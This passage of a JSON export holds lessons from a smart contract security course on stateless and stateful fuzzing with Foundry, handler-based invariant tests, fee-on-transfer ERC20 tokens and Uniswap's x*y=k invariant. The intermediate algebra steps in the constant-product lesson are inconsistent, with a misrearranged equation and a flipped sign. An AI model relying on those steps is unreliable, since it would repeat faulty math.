smart fuzzer and powered by 'Slither', it is a fantastic tool indeed. Another outstanding option is the [Consensys Fuzzer](https://github.com/Consensys/diligence-fuzzing). This is a paid corporate cloud fuzzer and hence we won't be able to provide a walkthrough for it. [Foundry](https://github.com/foundry-rs/foundry) is yet another promising candidate with built-in fuzzing.\n\nHere is the content that these READMEs possess:\n\n- An understanding of what invariants are\n- A better insight into the different strategies we plan to employ to break invariants and discover vulnerabilities.\n\nI strongly recommend that you go ahead, pause this session, and thoroughly read through this. Trust me, understanding it now will make it easier when we get into the hands-on segment.\n\n## Breaking Invariants: The Game Begins\n\nLet's now move forward to the fun segment â€“ you will write code along with me and understand every snippet. I assure you that by the end of this, you will have become an invariant testing pro. This mastery over the subject will help you discover vulnerabilities quicker and more effectively.\n\nFirst, in your code base, find the Invariant Break folder and remove it. Yes, you heard it right â€“ remove it! Doing so is a sure-shot way to ensure you are not merely copy-pasting but genuinely understanding every piece of code. Let's start with stateless fuzzing.\n\nOnce we are through with learning these strategies for fuzzing, we'll return to our Uniswap code base and familiarize ourselves with its 'x times y equals k' core invariant. We'll then try to break it and uncover bugs without examining the code base and solely understand the invariants.\n\nSo let's gear up and set out on this exciting and insightful journey of breaking invariants and fuzzing, navigating through this incredible world of coding and contracts. Let's learn, practice, improve, and ultimately â€“ strive towards becoming super badasses in smart contract testing and auditing.\n\n> \"The only way to learn a new programming concept is by writing programs.\" - Dennis Ritchie\n",
          "updates": []
        },
        {
          "lessonId": "de00c65e-7aa4-4e9c-bafb-c8df31aff63a",
          "number": 12,
          "title": "Stateless Fuzzing",
          "slug": "stateless-fuzzing",
          "folderName": "12-stateless-fuzzing",
          "description": "",
          "duration": 9,
          "videoUrl": "00TNZxT2re4tNO88zGwdb12ssA9fUDxByOGgZvEN2H00M",
          "rawMarkdownUrl": "/routes/security/5-tswap/12-stateless-fuzzing/+page.md",
          "markdownContent": "---\ntitle: Stateless Fuzzing\n---\n\n_Follow along with the video:_\n\n\n\n---\n\nToday, we'll be navigating through the SC exploits minimize codebase, focussing specifically on the `Invariant Break`. We aim to understand, practice, and discuss the power of stateless fuzzing, an essential tool in the world of software testing. Rest assured, we will also provide a minimized example to clarify how it works.\n\n## What is Stateless Fuzzing?\n\nStateless fuzzing, often referred to simply as fuzzing, is a technique where random data is supplied to a function to break some invariant or property. Remembering our discussion from the video of continuously attempting to pop a balloon serves as an apt analogy. It's all about continuously providing different inputs to a function until it breaks. If you have a function with an invariant that it should never return zero, then fuzz testing might just be the answer.\n\n## Breaking the Invariant: Writing the Test Case\n\nWith our codebase ready, and ourselves aware of the functionality we are testing. We need to write the test case to break it. Let's create a new folder named `Invariant Break` to prepare for our first stateless fuzz test. Naming the test `statelessfuzzcatchestest.sol`, we focus on catching the bug automatically using fuzz testing.\n\nThis test is more than just a unit test which checks the invariant once. With fuzzing, we apply various random numbers to the function and see if it breaks the invariant or not. The beauty of this strategy is that we can detect issues that can be missed out on during manual checks or basic unit tests.\n\n![](https://cdn.videotap.com/3SkpmLCCBFnsZH2yqkEW-412.31.png)\n\n## Setting the Fuzz Options\n\nLet's take a moment to understand the fuzz options. The number of runs determines the number of different balloons (inputs) we use in a stateless fuzz option. So we need to carefully adjust this value to ensure we're checking for as many edge cases as possible. Another crucial property is the seed, which, when kept the same, will offer the same inputs instead of random ones. This can be extremely helpful in debugging.\n\n![](https://cdn.videotap.com/BjOp2RCvRkPDt2VcD5fL-453.54.png)\n\nWith the fuzz options set, our test is ready to run. After a few runs, the test should fail, meaning our fuzz test has successfully caught the bugâ€”great job on creating your first fuzz test. But what if it doesn't fail? Well, you may need to increase the number of runs or change the seed. With randomness at play, there's never a 100% guarantee that you'll catch the bug in a particular run. This makes the fuzzing process a bit of hit or miss, but the advantages outweigh this con, as it helps to ensure the robustness of your functions.\n\nSeeding different values and number of fuzzing runs directly impact how thoroughly the test cases are checked. Adjust these values according to your specific needs, cover as many alleyways as possible - fuzz it till you dust it off! But remember, it's crucial to analyze the balance between the number of runs, seed selection and performance of your testing.\n\n## Wrapping Up Stateless Fuzzing\n\nIn conclusion, stateless fuzzing is a powerful tool for catching bugs where you expect a specific invariant. However, it's important to remember its limitations, such as being stateless and so not being able to pick up on issues caused by interactions between different functions. It's also a tool reliant on randomness, which means you can never be sure you've explored every possible scenario. Yet it remains a swift and highly efficient method for bug hunting.\n\nIn the upcoming sections, we'll move forward from stateless fuzzing to touch upon more complex and exciting testing methodologies. Until next time, happy fuzzing!\n\n> â€œItâ€™s not at all important to get it right the first time. Itâ€™s vitally important to get it right the last time.â€ - Andrew Hunt and David Thomas\n",
          "updates": []
        },
        {
          "lessonId": "34e42011-1e07-4f7a-ba66-cffd239fa490",
          "number": 13,
          "title": "Where Stateless Fuzzing Fails",
          "slug": "where-stateless-fuzzing-fails",
          "folderName": "13-where-stateless-fuzzing-fails",
          "description": "",
          "duration": 11,
          "videoUrl": "02AK19ljI63pu4cbDsKkJCgrjnBW101zIUKUzBt00Eum00w",
          "rawMarkdownUrl": "/routes/security/5-tswap/13-where-stateless-fuzzing-fails/+page.md",
          "markdownContent": "---\ntitle: Where Stateless Fuzzing Fails\n---\n\n\n\n---\n\nHello readers, today, we're diving into the realm of stateful fuzzing. If you've been following our development journeys on smart contracts, you already know about stateless fuzzing. Stateless fuzzing, as we've discussed before, starts every fuzz run from scratch.\n\nBut with stateful fuzzing, things get a bit more exhilarating! Upon each pass of stateful fuzzing, the outcomes from the previous run become inputs to the next run.\n\n### Defining Stateful Fuzzing\n\nSounds interesting? Let's illustrate using a simple example.\n\nImagine you have a balloon. You do one thing to try to pop it, say, drop it. If it doesn't pop, instead of grabbing a new balloon, you apply another action on the same balloon, like kicking or squeezing it.\n\nThe same theory applies to our smart contracts. We call a function on our contract, change its state, and then repeat the process on the **same** contract. Quite unlike stateless fuzzing, where you start with a fresh state at every run!\n\n#### Running the Fuzz Test\n\nAfter ensuring everything is set, weâ€™re now ready to run our fuzz test on this. Perhaps by making 1000 runs initially.\n\nDid it find a bug? No. You may be tempted to increase iterations to say, 10,000, then 100,000 or maybe even to a million runs! But listen, no matter how long you wait for the fuzzer to finish running, it will **never find the bug**\n\nThis is because the initial value was mounted at one and the balloon (contract state) you created is still at one, having slipped back to its initial state with each run. The only time it could return zero, breaking our invariant, is when the value changes to zero. Therefore, the contract's state must change.\n\nThis is precisely what a stateful fuzz test can find for us!\n\n> _â€œTalk is cheap. Show me the code.â€_  \n> _- Linus Torvalds_\n",
          "updates": []
        },
        {
          "lessonId": "c8b0a51e-b8f1-410b-9d57-1c56ccb99a22",
          "number": 14,
          "title": "Fuzzing Where Method 1 Fails",
          "slug": "fuzzing-where-method-1-fails",
          "folderName": "14-fuzzing-where-method-1-fails",
          "description": "",
          "duration": 18,
          "videoUrl": "iZX9yLjkpgEbXjjuBnUcETEtjs4UUyvUHIn1OXYWIxc",
          "rawMarkdownUrl": "/routes/security/5-tswap/14-fuzzing-where-method-1-fails/+page.md",
          "markdownContent": "---\ntitle: Stateful Fuzzing Where Method 1 (open) Fails\n---\n\n\n\n---\n\nWelcome back fellow learners! We are on this exciting journey together to lay the foundation of Smart Contract Security Testing. What have we learned thus far?\n\n## Stateless Fuzzing vs Stateful Fuzzing\n\nWe discovered that stateless fuzzing was not effective in detecting bugs in functions which require more complexity, such as `changeValue` - a function which updates a contract's state.\n\n```js\nfunction changeValue(uint256 _value, uint256 _multiplier) public {\n    value = _value * _multiplier;\n}\n```\n\nIn this case, we employed a mechanism known as stateful fuzzing. With this method, we can catch much more subtle and nuanced bugs by accounting for contract state changes during fuzzing.\n\nHowever, we encountered a hiccup when we were dealing with an integer overflow issue. We had to set the `failOnRevert` to `false` for our fuzzing test to work! That's because `myValue` could be a huge number, larger than a `uint256` can hold, causing an overflow.\n\nDespite these hurdles, we soldiered on and made it this far. Now, it's time to graduate to an even more complex scenario - fuzzing a vault contract!\n\n## Breaking The Invariant With Stateful Fuzzing\n\nSo, let's start by attempting to break this invariant using stateful fuzzing.\n\nFirstly, we'll set up the test contract and import our dependencies, including the token mocks that will be used.\n\nNext, we'll create a token array and launch the tokens to be supported by our token vault. We will then set up the user who'll be interacting with the vault and provide them with a starting amount of tokens.\n\nFinally, we compose the fuzzing test itself. We begin by pranking the user, effectively manipulating their available tokens. We then perform the withdrawal operation of both types of tokens from the vault. Eventually, we assert that the user's token balance has not changed after the deposit and withdrawal operations.\n\nThe critical learning here is that we should always be able to withdraw the same amount we've deposited - this assertion must not fail!\n\n## All That Glitters Is Not Gold\n\nAlas, it appears that we celebrate too soon. On running this test, it's clear that we've run into an issue - our deposit function fails!\n\nWhen this happens, a good practice is to turn on the verbose logs ( -vvv flag) to see what's happening beneath the hood. We quickly detect the root cause - our fuzzer was making deposit attempts with unsupported tokens.\n\nToo much randomness in fuzzing can be just as detrimental as not enough randomness. We also notice that we never made the approve call for the ERC20 tokens, which was necessary for a deposit operation. Our fuzz test was essentially doomed from the start!\n\n## TL;DR\n\nIn this blog post, we discussed the progression from stateless to stateful fuzzing for smart contract testing. While stateless fuzzing is fantastic for catching some easy bugs, it falls short in detecting bugs in the case of more complex functions.\n\nStateful fuzzing overcomes these limitations, but it comes with its own set of challenges, like dealing with integer overflows. The takeaway here is the importance of finding the goldilocks zone of randomness while fuzzing - too little or too much can skew our test results!\n",
          "updates": []
        },
        {
          "lessonId": "4a94be28-9b2e-49ca-a666-7eac99cf2d6d",
          "number": 15,
          "title": "Stateful Fuzzing Method 2",
          "slug": "stateful-fuzzing-method-2",
          "folderName": "15-stateful-fuzzing-method-2",
          "description": "",
          "duration": 14,
          "videoUrl": "a01yHqmMWhOEY79XH1gkkBboGZ01nJGkzudX5VnjBXQaY",
          "rawMarkdownUrl": "/routes/security/5-tswap/15-stateful-fuzzing-method-2/+page.md",
          "markdownContent": "---\ntitle: Stateful Fuzzing Method 2\n---\n\n_Follow along with the video:_\n\n\n\n---\n\n# Working with Smart Contracts Using Foundry: Setting up Handlers and Invariant\n\nIn this digital world where cryptocurrencies like Bitcoin, Ethereum, and others are trending, it's essential to understand how to use and create smart contracts. This article will guide you on how to create two new contracts utilizing Foundry; a known blockchain testing framework. The contracts to be created are `handler.t.sol` and `Invariant.t.sol`.\n\nComing along, we will also explore how to work with the `fail on revert` function.\n\n## Setting up the Handler Contract: `handler.t.sol`\n\nHandling smart contracts could be complex, especially if you're a beginner. However, with Foundry, we can manage our function calls to focus on vital operations for our code base, resulting in a less error-prone contract.\n\nConsider the idea that we have two types of users in our system; one who can deposit and another, withdraw. This simplification gives us a better sense of controlling bugs by ensuring an easier flow of interactions. Consequently, the `fail on revert` option should ideally be set to true. This validation will allow us to confirm the validity of our tests.\n\nWhen set to false, if our fail on revert test passes, it presents no valuable insight because there are too many pathways for the fuzzer to follow, potentially calling irrelevant functions. Although starting with the fail on revert set to false can be a suitable starting point, the intention should always be to work towards getting it set to true.\n\nNow, to the creation of our `handler.t.sol`. This particular contract will be set up as the intermediary for restricting the `handler stateful Fuz catches` contract.\n\nThrough the handler, we will instruct our Foundry and `Stateful Fuzzing Test Suite` to correlate with the `handler stateful Fuz catches` contract appropriately. We are essentially telling the Foundry when to call deposit, to approve, mint, and have the tokens. Likewise, when to call withdraw; all these with precise guidelines on avoiding explosive function calls.\n\nIn the handler contract, specific lines are written for the 'ERC20 token' and the 'USDC token'. Here's what the snippet looks like:\n\nThis handling setup focuses on 'deposit' and 'withdraw' functions thus curbs randomness and gives our fuzzer more accurate paths to follow, thereby giving correct and more reliable test results.\n\n## Setting up the Invariant Contract: `Invariant.t.sol`\n\nThe `Invariant.t.sol` involves creating the invariant test. Here, unlike in the handler contract `handlerT.sol`, we are particularly interested in an invariant that interacts with the handler contract and not the actual contract.\n\nTo begin setting up `Invariant.t.sol`, start by importing the handler with a line of code that looks like this:\n\nConsequently, instead of fuzzing the actual contract, we are going to fuzz the handler in a process that is easier and more sensible. The logic is that we want our transactions handled in a way that makes sense and thus the adoption of the `fuzz selector` as seen in the code below:\n\nThis instructs the contract that the selectors and the target address to be used are those outlined in the handler.\n\n## In Conclusion\n\nSetting up the `handlerT.sol` and `Invariant.t.sol` contracts helps break down the complexity of dealing with smart contracts. By implementing these contracts, we have given Foundry a framework to follow that makes its function calls more logical and less random. Therefore, we no longer have to deal with reverts, and we can focus better on our tests, making our iterations more meaningful and insightful.\n\nRemember, the best way to become proficient at handling smart contracts is repetition. Practice by trying these methods out on your old code bases, which should help you improve your coding skills and understanding of stateful fuzzing. You don't have to become an expert all at once; take small steps and ask questions when you face roadblocks.\n\nAll being said, smart contracts could save significant time, reduce the risk of manual errors, and thus revolutionize the way we perform secure transactions. Learning how to work with them will not only keep you relevant but also give your work an edge.\n\n> Note: This article assumes that you have a basic knowledge of smart contracts Foundry and programming. It might be helpful to do a bit of reading if you're not familiar with these topics.\n\nHappy coding!\n",
          "updates": []
        },
        {
          "lessonId": "2b9d46bd-50a3-4def-8595-618c46346854",
          "number": 16,
          "title": "Debugging Fuzz Sequences",
          "slug": "Debugging-Fuzz-Sequences",
          "folderName": "16-Debugging-Fuzz-Sequences",
          "description": "",
          "duration": 7,
          "videoUrl": "RnyCSAFxT00kVdWQ1DCFWsz94SFQiBZFScRyrlh02JCw8",
          "rawMarkdownUrl": "/routes/security/5-tswap/16-Debugging-Fuzz-Sequences/+page.md",
          "markdownContent": "---\ntitle: Debugging Fuzz Sequences\n---\n\n\n\n---\n\n# Invariant Testing, Fuzzing, and a Weird ERC-20 Exploit\n\n## Introduction\n\nHello, folks! In this blog post we'll embark on an exciting journey of executing invariant testing using a fuzzer. We will encounter misconfigurations, understand the output generated, identify the source of confused states (yes, we're going to meet a weird ERC20 token variant!), and unveil the importance of writing good tests, especially when dealing with external contracts.\n\nReady? Let's get started!\n\n## The Initial Fuzzing Scenario\n\nThe first thing we need to do is run our fuzzer, which is already configured to a contract, in our case, the \"Mock USDC.\" We have coded a fuzzer test, `forge test --mt`, that we'll apply here.\n\n**_Code to be inserted:_**\n\n```shell\nforge test --mt name-of-test\n```\n\nAs we eagerly anticipate a successful test run...\n\n### Problem Identification: The Fuzzerâ€™s Anarchy\n\n![](https://cdn.videotap.com/dJ9d44aCK4jLbP02SRGT-77.81.png)\n\nUnfortunately, things don't turn out as planned. The fuzzer is attempting to interact with every possible edge, not just the \"handler\" contract we intended to speculate. To tether its leash back, we explicitly identify the target contract.\n\nAfter the amendment, another run of the test is conducted.\n\n### Signalling Errors: The Test Output\n\nRun again, we are greeted with an error message from a call to `withdrawYield` (ERC20).\n\nThe output isn't clear, but running the command `-VVV` (very, very verbose) may shed light on the error. The detailed output points fingers at an \"insufficient balance,\" raising questions why our fuzzer-guided users are struggling to withdraw tokens they own.\n\nAttempting to better understand this scenario, we consciously decide to ignore the revert conditions. However, the issue persists, generating a mountain of output data.\n\nA new strategy is formulated to drop â€˜the seedâ€™ controlling the fuzz, re-running the test in search of more comprehensible output.\n\n## Deep Dive: The Problematic ERC20 Token\n\nAnalysis of new output traces reveal that the `depositYield` function is also encountering a revert condition. A comparison of the pre and post-amendment data validates the improvement acquired through the fuzz restriction.\n\nThe error persists through multiple test runs, so we opt to investigate the contract code, revealing nothing out of the ordinary in the `withdrawToken` function, a likely suspect. Maybe the issue lies within the token itself?\n\nA scrutiny of `yieldYear20` also reveals nothing amiss, except one: a custom error message.\n\nThe error signals a lack of balance, an oddity since the userâ€™s balance should align with the deposit amount. But it's the fine print that throws a spanner in the works.\n\n## Unraveling the Truth: A Sinister Token\n\nLooking further into the `yieldYear20` token, we notice an eccentric mechanism: for every 10 transactions, a 10% fee is deducted and transferred to the owner. Smelling a rat, this erratic behavior is the root of the violation of our invariant.\n\n### An Unexpected Result: Violation of the Invariant\n\nHereâ€™s what unfolds: after back-to-back deposit and withdrawal transactions of the `yieldYear20` tokens, the 10th transaction deducts this 'fee,' dispatching 10% of tokens to the owner's contract. This act violates our invariant, which demands that users can always withdraw the exact balance fraction amount.\n\n## Importance of a Well-Written Test Suite\n\nLuckily, our top-notch stateful fuzzing test suite spotted the anomaly. It showcased the significance of having well-detailed tests, especially when external contracts, such as tokens, are involved. This informal audit brought attention to a significant pitfall potential, â€œWeird ERC-20 tokens.â€\n\n### Wrap Up: Invitations, Exploitations, and Auditations\n\nâ€œCongratulations for digesting this massive chunk of knowledge! Don't fret if you're perplexed; it's a lot to take in, especially without hands-on practice. But remember, Rome wasn't built in a day!\n\nThe key takeaway here is the importance of writing detailed test suites, accurately capturing potential anomalies that could break our system. As for our journey, you've just witnessed the first exploit of this session, the \"Weird ERC-20 Tokens,\" a concept we will explore in-depth in coming sessions.\n\n> â€œTo iterate is human, to recurse, divine.â€ â€“ L. Peter Deutsch\n\nHaving unraveled the problem, we're now geared up for the final leg of our expedition, auditing the â€˜T-Swap protocol.' Stay tuned, as exciting discoveries await!\"\n",
          "updates": []
        },
        {
          "lessonId": "f69e22bd-9912-4545-812b-1a44744e6120",
          "number": 17,
          "title": "Fuzzing Recap",
          "slug": "fuzzing-recap",
          "folderName": "17-fuzzing-recap",
          "description": "",
          "duration": 2,
          "videoUrl": "ZIreQHFgdWlZ5jhfq51kxYNglTrhnlQ9LNkW5kybSCM",
          "rawMarkdownUrl": "/routes/security/5-tswap/17-fuzzing-recap/+page.md",
          "markdownContent": "---\ntitle: Fuzzing Recap\n---\n\n\n\n---\n\n# Mastering the Art of Fuzzing: Stateless, Stateful, and Weird ERC 20 Exploits\n\nIn this blog post, we're going to dive into the exciting world of `fuzzing`. Hang in there and get ready to uncover the intricacies of stateless fuzzing, explore the intriguing concept of stateful fuzzing, programmatically exploit the Weird ERC 20, and navigate the maze of manual bug finding in your codebase.\n\n## A Quick Recap: All About Stateless Fuzzing\n\nSo, what did we just uncover? We got to grips with the powerful tool called `stateless fuzzing`. Stateless fuzzing offers invaluable aid to developers as it tests a system with a series of random inputs, shreds through layers of errors, helps to uncover bugs in a codebase, and optimizes system performance.\n\nHowever, stateless fuzzing does have a downside. Its efficiency falls abruptly when it comes to `stateful fuzzing`. Why? Because stateful fuzzing isn't just about pounding a codebase with random inputs. It's more like a well-choreographed dance sequence, requiring precise steps and accurate timing.\n\n_\"Stateless and stateful fuzzing holds the same end goal: to identify and fix bugs and vulnerabilities in a codebase. However, they approach this goal from different perspectives.\"_\n\n## The Handler Method: Bridging the Gap between Stateless and Stateful Fuzzing\n\nBut here's the shimmering light at the end of the tunnel: the handler method. This handy little method functions as a proxy that enables us to call our contract and achieve a more nuanced stateful fuzzing strategy, especially when dealing with complex contracts.\n\nIn simple terms, the handler method allows us to make our randomness `less random`. This directed randomness enables stateful fuzzing to probe more effectively into a codebase's vulnerabilities.\n\nIt helps the fuzzer go down paths that make sense, ensuring a more efficient and targeted fuzzer run.\n\n![](https://cdn.videotap.com/imecUt1GioVaw6WCZCUs-33.1.png)\n\n## Teasing the Weird ERC 20 Exploits\n\nNext, we dipped our toes into the Weird ERC 20 exploit. While we didnâ€™t dive deep into this topic, consider it your cliffhanger, your incentive to keep learning! Weâ€™ll be exploring the Weird ERC 20 in detail soon enough. It's an exploit you definitely donâ€™t want to miss because it is a crucial tool to test more advanced code contracts.\n\n_\"In the world of coding and security breaches, the 'weird ERC 20' presents itself as a fascinating challenge and a riveting exploit that aids in uncovering deeper vulnerabilities within the code.\"_\n\n## Looking Forward: The Road Ahead with TSWAP and Manual Review\n\nWith this newly acquired knowledge, next on our agenda is to apply these techniques to `TSWAP` and run stateful fuzzing tests. After we've done that, we'll dive headlong into the fascinating world of manual reviews.\n\nThe manual review process can seem tedious, especially since it involves hunting down bugs without any automation. But rest assured, itâ€™s an amazing learning journey that adds tremendous value to your skillset as a developer.\n\n## Take-A-Break Strategy\n\nAfter this whirlwind tour of fuzzing, exploit, and reviews, youâ€™ve made it so far and gained quite a bit of expertise! Peeling back layers of codes, vulnerabilities, and in-depth testing strategies can be mentally taxing, which is why it's important to give your brain some downtime.\n\n_\"Learning is a marathon, not a sprint; don't forget to hydrate, take breaks, and recharge yourself.\"_\n\nFeel free to take a short break, stretch a bit, go for a walk or do anything you find relaxing. When youâ€™re ready, we'll reconvene and continue our descent into the rabbit hole of coding exploits and vulnerabilities, enriched, refreshed, and ready for more.\n\nUntil then, congratulations once again and see you after your well-deserved break!\n\nStay tuned for more fuzzing and coding action in the next blog entry!\n",
          "updates": []
        },
        {
          "lessonId": "193a4e62-8f2e-41e3-bfaa-9d9006564d17",
          "number": 18,
          "title": "Weird Erc20s",
          "slug": "weird-erc20",
          "folderName": "18-weird-erc20",
          "description": "",
          "duration": 4,
          "videoUrl": "m1vcLcx9Hm2EscLBPq2jk93Gj4xFU8LW65qqwPQ02tLM",
          "rawMarkdownUrl": "/routes/security/5-tswap/18-weird-erc20/+page.md",
          "markdownContent": "---\ntitle: Exploit - Weird ERC20s (These are a menace to Web3)\n---\n\n\n\n---\n\n# Exploring the Weird World of ERC-20 Smart Contracts: Security, Oddities and Auditing\n\nIn this blog post we'll delve into one of the most interesting parts of the decentralized area - ERC-20 Smart Contracts and their intricate aspects. Weâ€™re going to go back to the `cipher` security and auditing full course on GitHub and explore more about a special section named **TSWAP**, specifically _section five_.\n\n## Tackling the ERC-20 Quirks\n\n> _Remember, it's the stuff we don't know that keeps us up at night._\n\nOne weird instance that we are going to discuss today is about `ERC-20 fee on transfer token`, which was part of the `SC_exploits`. When testing this token, it was found that for every ten transactions, a fee was being charged. This might seem innocuous, but this little oddity has the potential to destabilize numerous protocols.\n\n![](https://cdn.videotap.com/AepJ0CJaMiwbHLC1x4GC-49.5.png)\n\n## The Anomalies of ERC-20 Tokens\n\nERC-20 Tokens come in all shapes and sizes. Here's a glimpse into some of the variants and potential problems that lurk in the shadows:\n\n1. **Reentrant tokens**: These ERC-777s seem harmless, but even a simple transfer of these tokens can lure you into a pit of reentrancy attacks.\n2. **Missing return values**: Some tokens donâ€™t return a boolean on ERC-20 methods. For transactions requiring a status check, this can be a potent problem.\n3. **Fee on transfer**: Some tokens sneak in a fee on every transfer while others can start doing so in the future.\n4. **Upgradable tokens**: These tokens, like USDC, could morph into anything over time.\n5. **Rebasing tokens**: These tokens magic away your balance by meddling with different contracts.\n6. **Tokens with blocklists**: Some tokens put restrictions on certain transacting parties.\n7. **Low/high decimals**: Token numbers can go from unusually low to abnormally high, causing calculation mishaps.\n8. **Multiple token addresses**: These tokens exist in more than one places at once.\n\n## Dealing with ERC-20 Tokens Anomalies\n\n![](https://cdn.videotap.com/4oHWptmu7liSgxFnB37w-170.5.png)\n\nERC-20 Tokens are an external smart contract that one must treat with a level of wariness. While integrating with them, you must be fully aware of the tokenâ€™s characteristics.\n\nBlockquote:\n\n> _Playing in the world of ERC-20s without complete information is like dancing on a live minefield._\n\nA cagey approach to interacting with ERC-20s can be the difference between a successful dApp and a failed project.\n\n![](https://cdn.videotap.com/fnsDlRcZfomWTHFt6MFT-214.5.png)\n\nIn conclusion, if you are aspiring to be a top-flight builder of powerful smart contracts. This website is an excellent guide to understanding and gaining expertise in the world of smart contracts. It serves as both a practical tool and an in-depth manual to secure smart contracts.\n\nAnd remember, \"The first step to great security is being aware about all the unknowns!\".\n",
          "updates": []
        },
        {
          "lessonId": "6a0f18c4-814b-4633-b5b4-003b101496a7",
          "number": 19,
          "title": "Writing Stateful Fuzz Test Suite",
          "slug": "writing-stateful-fuzz-test-suite",
          "folderName": "19-writing-stateful-fuzz-test-suite",
          "description": "",
          "duration": 1,
          "videoUrl": "T01QiR8liaNn83eu02na8c5eRUv2YNPN1lrReX022P13WM",
          "rawMarkdownUrl": "/routes/security/5-tswap/19-writing-stateful-fuzz-test-suite/+page.md",
          "markdownContent": "---\ntitle: Writing Stateful Fuzz Test Suite\n---\n\n\n\n---\n\n# Unearthing Invariant Bugs in T Swap: An In-Depth Look at Stateful Fuzzing\n\nIn the world of code development, testing isn't just a good practice â€“ it's essential. This article provides a holistic perspective on a recent exploration into T Swap's codebase, observed practices, and the application of stateful fuzzing test suites.\n\n## Understanding T Swap: The Prelude\n\nBefore we delve into our primary focus, let's backtrack and recap.\n\nWhile sifting the codebase, it was evident that T Swap is well-grounded in underlying unit tests. However, the presence of specific entity, a certain critical invariant, led to a realization about the absence of something integral.\n\n> \"If the codebase has unit tests but no stateful fuzzing test, should we be concerned?\"\n\nOur answer to this turned out to be a resounding yes. It was a hint pointing towards the potential issues nestled within the T Swap system. Identifying these areas for improvement was not held within the realms of SRC â€“ it was staring right at us.\n\n## The Task at Hand: Writing an Invariant Test Suite\n\nStepping back to our main branch, we essentially locked eyes with an important discrepancy. Our codebase recognized its unit tests yet failed to host stateful fuzzing tests. And thus, the mission was clear. We were mandated to write the stateful fuzzing test suite and slightly so, expected to discover bugs in the process.\n\nThe task involved working directly with the T Swap's codebase, devising an automated stateful fuzzing invariant test suite. We believed that by accomplishing this, we would be able to unmask potential bugs within the system.\n\n## The Rollout: A Zero Manual Review Approach\n\nIn a paradigm shift from conventional methods, we decided to go zero manual review - a method entirely run by an automated test suite. While this may seem daunting, the focus was to write an automated test suite that will identify the bugs without human interference.\n\nHowever, to validate our automated test suite's competence, we decided to undertake a modest amount of manual review. This was a complimentary step to ensure the robustness of our newly coded test suite.\n\nAfter exacting the plan, we were ready to run our test suite and examine the results.\n\n## In Summary\n\nUsing hints from the T Swap's system peculiarities and their own testing protocols, we realized that there was an absence of an integral part of test coverage â€“ stateful fuzzing tests. A thorough exploration of this deficiency led us to write an automated invariant test suite, supplemented by a hint of manual review.\n\nThe goal was to find bugs with minimum manual intervention, and guess what? We did find some. So, stay tuned for the next part of this journey as we dissect the bugs and understand how to rectify them!\n\nRemember at all times, coding might be art, but testing is a science!\n",
          "updates": []
        },
        {
          "lessonId": "661fbd6d-5f1e-4b21-9330-9836857077d7",
          "number": 20,
          "title": "Constant Product Formula Explained",
          "slug": "constant-product-formula-explained",
          "folderName": "20-constant-product-formula-explained",
          "description": "",
          "duration": 9,
          "videoUrl": "QZsbxhV2ceWGdd2qwwAJzdHWTOLXaMovBmvAEq5eDJY",
          "rawMarkdownUrl": "/routes/security/5-tswap/20-constant-product-formula-explained/+page.md",
          "markdownContent": "---\ntitle: Constant Product Formula Explained\n---\n\n\n\n---\n\n# Unraveling the Math in Uniswap's X \\* Y = K Invariant\n\n> **\"The main thing we want to keep in mind is the ratio of tokens should always stay the same.\"**\n\nUniswap, a popular decentralized exchange protocol, leverages a relatively simple mathematical principle to ensure that the balance within the pool maintains a certain ratio. At the core of its mechanism is the invariant formula: X \\* Y = K, which is held constant throughout all trading activities. However, when fees are factored in, the invariant technically increases, leading to a somewhat complex equation which we'll dissect further in this blog post.\n\nSeeing all the math involved, you might feel a bit overwhelmed, but hang tight, as we take a deep dive into the intricacies of the math and algebra involved. If you are someone with a keen interest in mathematics and decentralized finance, strap yourself in as we journey down this Uniswap mathematical express.\n\n## X \\* Y = K, The Magic Invariant Equation\n\nOur first step is to grasp the magic invariant equation, X \\* Y = K. Our code base operates on an invariant principle where the token balance of X times the token balance of Y should always equal the same constant, K.\n\nHere is the equation:\n\n```ruby\nX * Y = K\n```\n\nThe token balance of X times the token balance of Y after a swap operation should still equal the same constant K, regardless of the asset swapped. Let's illustrate the idea using an example:\n\nGiven we have a Uniswap pool of Ethereum (WETH) and USD Coin (USDC), and a trader makes a swap operation â€” removing some WETH to add some USDC â€” the balance ratio should remain constant to prevent the trader from manipulating the price to their advantage.\n\n![](https://cdn.videotap.com/7AR7AuVGUkohvd6xDQ8G-119.24.png)## Simplifying The Equation\n\nThe X \\* Y = K equation might seem a straightforward invariant, but implementing it as an assertion in the codebase can be challenging. But don't worry â€” to ease the process, we need to simplify this equation to a form where we can explicitly say the change in token balance must always follow a certain formula.\n\nWe'll simplify the equation using algebra to a format suitable for â€œstateful fuzz testingâ€. Don't feel pressured if you don't follow every step; you can still hold on to the principle that checks out.\n\nHereâ€™s the process of simplifying the equation using algebra:\n\n1. Starting with the core equation and its variant:\n\n```ruby\nX * Y = K (core equation)X * Y = (X + âˆ†X) * (Y - âˆ†Y) (With changes âˆ†X and âˆ†Y in X and Y)\n```\n\n![](https://cdn.videotap.com/QHzVQA2HNb4hbKJl7pYc-220.14.png)2. Using the FOIL (First Outer Inner Last) algebraic method to simplify the equation:\n\n```ruby\nX*Y - X*âˆ†Y  = X*Y + âˆ†X*Y - âˆ†X*âˆ†Y\n```\n\n3. X\\*Y appearing on both sides of the equation:\n\n```ruby\n-X*âˆ†Y  = âˆ†X*Y - âˆ†X*âˆ†Y\n```\n\n4. Isolate the change in X (denoted as âˆ†X):\n\n```ruby\nâˆ†X * Y - âˆ†X * âˆ†Y = X * âˆ†Y\n```\n\n5. Factor out âˆ†X:\n\n```ruby\nâˆ†X * (Y - âˆ†Y) = X * âˆ†Y\n```\n\n6. Solve for âˆ†X:\n\n```ruby\nâˆ†X = (X * âˆ†Y) / (Y - âˆ†Y)\n```\n\nAnd there you have it! We've simplified the equation from X \\* Y = K, down to âˆ†X = (X \\* âˆ†Y) / (Y - âˆ†Y) â€” an equation we can use in our fuzz test!\n\n![](https://cdn.videotap.com/q4fjlDbGWHwTtzGV6qC4-467.79.png)## Wrapping Up and Next Steps\n\nWe did some crafty algebra to break down X \\* Y = K to a simplified equation. Remember, the formulas we were dissecting are vital for the Uniswap protocol to maintain a balanced token ratio, hence they are also vital for us when creating our stateful invariant testing suite.\n\nDon't despair if the blocks of algebra seems difficult to understand because all the math we've covered will be included in the associated Github repo. If you're more comfortable with visual diagrams or need a deeper explanation of mathematical techniques, [Chat GPT](https://chat.openai.com/) can be very helpful.\n\nFor those who wish to take an even deeper dive into the formal verification of the X\\*Y=K market maker model, the respected paper on [Runtime Verification](https://runtimeverification.com/) goes into detail about how the formula works from a formal perspective.\n\nThanks for reaching this part, keep up the good work, and see you in the next blog post!\n",
